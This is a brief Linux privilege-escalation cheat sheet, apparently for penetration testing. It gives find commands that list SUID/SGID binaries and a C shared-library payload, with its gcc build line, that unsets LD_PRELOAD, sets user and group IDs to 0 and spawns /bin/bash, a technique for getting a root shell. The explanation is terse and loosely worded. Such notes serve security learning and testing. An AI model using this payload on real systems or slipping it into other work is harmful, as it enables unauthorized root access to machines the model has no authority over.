SUID and SGID bit allows you to execute the permission of the owner or group respectively
to find these file you can use the following command
```shell
find / -type f -perm -04000 -ls 2>/dev/null
```
or
```shell
find / -perm /u=s,g=s 2> /dev/null
```
# example 
```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
```shell-session
gcc -fPIC -shared -o lib.so file.c -nostartfiles
```